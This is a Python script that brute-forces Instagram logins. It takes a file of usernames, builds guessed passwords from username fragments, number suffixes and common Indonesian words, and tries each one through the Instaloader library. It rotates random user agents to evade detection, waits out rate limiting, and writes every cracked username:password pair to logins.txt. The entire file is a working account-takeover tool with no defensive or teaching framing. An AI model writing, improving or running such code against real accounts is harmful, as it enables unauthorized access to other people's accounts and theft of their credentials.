import random
import requests
import time
from instaloader import Instaloader
from instaloader import exceptions
from instabot import Bot
from threading import Thread
from colorama import Fore

normal_color = Fore.RESET
red_color = Fore.RED
green_color = Fore.GREEN 

def generatePassword(username):
    password = []
    splites = [".", "_"]
    for splt in splites:
        if splt in username:
            x = username.split(splt)
            if len(x) > 0:
                for xx in x:
                    password.append(xx)
                    other = ["1", "12", "123", "321", "12345", "32", "54321", "1234"]
                    for o in other:
                        password.append(xx + o)
    other_password = ["indonesia", "majalengka", "indonesia123", "indonesia1", "indonesia12", "indonesia1234", "indonesia54321", "indonesia321", "majalengka123", "bangsat123", "bangsat", "bangsat123"]
    for other in other_password:
        password.append(other)
    return password

uas = open("user-agents.txt", "r").read().splitlines()
def randomUA():
    ua = []
    for x in uas:
        if "#" in x or x == " " or x == "": continue
        else:
            ua.append(x)
    return random.choice(ua)

def crack(i):
    usernames = open(i, "r").read().splitlines()
    idx = 0
    for user in usernames:
        idx += 1
        passwords = generatePassword(user)
        print ("[ %d ] Trying: %s" % (idx, user))
        for pasw in passwords:
            print ("[!] Try password " + pasw)
            try:
                ua = randomUA()
                print ("[!] Set User Agent ~> " + ua)
                L = Instaloader(user_agent=ua, sleep=True)
                L.login(user, pasw)
                saved = open("logins.txt", "a")
                saved.write(user + ":" + pasw + "\n")
                saved.close()
                print (green_color + "[+] Login success " + pasw + normal_color)
                break
            except exceptions.BadCredentialsException as Bad:
                print (red_color + "[-] Unknown password " + pasw + normal_color)
            except exceptions.TwoFactorAuthRequiredException:
                print ("[-] Privated " + pasw)
            except exceptions.ConnectionException as e:
                time.sleep(60)
                print ("[!] Wait 1 minute")
            except exceptions.InvalidArgumentException:
                print ("[-] Username not found")
                break
        print ("-" * 50)    

i = input("Input file: ")
th = Thread(target=crack, args=(i,))
th.start()